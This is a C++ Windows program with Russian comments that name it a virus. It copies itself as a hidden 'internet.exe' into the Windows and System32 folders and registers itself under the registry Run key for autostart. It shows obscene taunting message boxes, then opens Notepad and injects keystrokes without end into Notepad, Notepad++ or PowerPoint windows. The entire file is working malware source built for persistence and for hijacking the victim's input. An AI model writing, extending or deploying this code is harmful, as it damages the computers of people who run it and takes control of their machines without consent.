// Подключаем библиотеки и создаем основные переменные.

#include <windows.h>
#include <iostream>
#include <cstdlib>

int WINAPI WinMain(HINSTANCE hint, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){
	HKEY key;
	char sysdir[256],
	windir[256],
	myname[256];

	/*Узнаем свое имя функцией GetModuleFileName. И узнает адрес папки windows и папки system32 функциями GetWindowsDirectory и GetSystemDirectory*/

	GetModuleFileName(hint,myname,256);
	GetWindowsDirectory(windir,sizeof(windir));
	GetSystemDirectory(sysdir,sizeof(sysdir));
	
	/*Добавляем к строкам содержащим пути к системным папкам имя нашего вируса, чтобы скопировать в эти папки себя.*/

	strcat(windir,"\\internet.exe");
	strcat(sysdir,"\\internet.exe");

	//Копируемся и ставим себе скрытые атрибуты

	FreeConsole();
	
	CopyFile(myname,windir,FALSE);
	CopyFile(myname,sysdir,FALSE);
	SetFileAttributes(windir,FILE_ATTRIBUTE_HIDDEN);
	SetFileAttributes(sysdir,FILE_ATTRIBUTE_HIDDEN);
	//Прописываемся в реестр на автозагрузку

	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0,KEY_WRITE, &key);
	RegSetValueEx(key,"internet.exe",0,REG_SZ,(BYTE *)sysdir,256);
	RegCloseKey(key);
	
	MessageBox(NULL,"Ярик пизда компу блять!","Error!",MB_OK | MB_DEFBUTTON1 |MB_ICONWARNING);
	if(IDOK){
		MessageBox(NULL,"Ну шо, готов сосать?","Помянем",MB_YESNO | MB_DEFBUTTON1 |MB_ICONQUESTION);
		Sleep(1500);
	}
	Sleep(3000);
	
	system("start C:\\Windows\\system32\\notepad.exe");
 
	int k=0;
	do{
		if (FindWindow(NULL, "Безымянный — Блокнот")!=0 || FindWindow(NULL, "Notepad++")!=0 || FindWindow(NULL, "Microsoft PowerPoint")!=0)
		{
			ShowWindow(FindWindow(NULL, "Безымянный — Блокнот") , SC_MAXIMIZE);
			LoadKeyboardLayout("00000419", KLF_ACTIVATE);
			Sleep(1000);
			do{
				keybd_event('C', 0,0,0);
				keybd_event('C', 0,KEYEVENTF_KEYUP,0);
				keybd_event('F', 0,0,0);
				keybd_event('F', 0,KEYEVENTF_KEYUP,0);
				keybd_event('C', 0,0,0);
				keybd_event('C', 0,KEYEVENTF_KEYUP,0);
				keybd_event('B', 0,0,0);
				keybd_event('B', 0,KEYEVENTF_KEYUP,0);
				keybd_event(VK_SPACE, 0,0,0);
				keybd_event(VK_SPACE, 0,KEYEVENTF_KEYUP,0);
			}while(1);
		}
	}while(1);
	return 0;
}

